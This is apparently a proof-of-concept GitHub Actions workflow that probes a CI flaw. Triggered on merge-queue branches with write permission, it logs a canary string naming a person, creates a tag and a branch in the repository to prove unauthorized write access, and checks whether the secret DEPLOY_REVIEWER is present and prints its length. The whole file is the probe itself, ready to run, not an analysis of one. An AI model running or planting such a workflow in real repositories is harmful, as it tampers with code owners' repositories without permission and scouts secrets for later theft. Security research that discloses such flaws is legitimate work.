name: Fork Write Proof
on:
  push:
    branches:
      - "gh-readonly-queue/**"

permissions:
  contents: write

jobs:
  write-proof:
    runs-on: ubuntu-latest
    steps:
      - name: Prove write access
        uses: actions/github-script@v7
        with:
          script: |
            console.log('CHAIN_CANARY_2: Luuk Brouwer MNT-8842-109');
            console.log('repository:', context.repo.owner + '/' + context.repo.repo);
            console.log('event:', context.eventName);
            console.log('ref:', context.ref);
            
            // Create a tag to prove contents:write works
            const tagName = 'write-proof-' + context.runId;
            console.log('Creating tag:', tagName);
            try {
              const result = await github.rest.git.createRef({
                owner: context.repo.owner,
                repo: context.repo.repo,
                ref: 'refs/tags/' + tagName,
                sha: context.sha
              });
              console.log('TAG_CREATED: true');
              console.log('tag_ref:', result.data.ref);
              console.log('tag_sha:', result.data.object.sha);
            } catch (e) {
              console.log('TAG_CREATED: false');
              console.log('tag_error:', e.message);
              console.log('tag_status:', e.status);
            }
            
            // Try creating a branch too
            const branchName = 'write-proof-' + context.runId;
            console.log('Creating branch:', branchName);
            try {
              const result2 = await github.rest.git.createRef({
                owner: context.repo.owner,
                repo: context.repo.repo,
                ref: 'refs/heads/' + branchName,
                sha: context.sha
              });
              console.log('BRANCH_CREATED: true');
              console.log('branch_ref:', result2.data.ref);
            } catch (e2) {
              console.log('BRANCH_CREATED: false');
              console.log('branch_error:', e2.message);
              console.log('branch_status:', e2.status);
            }
      - name: Check secrets
        env:
          HAS_SECRET: ${{ secrets.DEPLOY_REVIEWER != '' }}
          SECRET_LEN: ${{ secrets.DEPLOY_REVIEWER }}
        run: |
          echo "has_secret: $HAS_SECRET"
          echo "secret_length: ${#SECRET_LEN}"
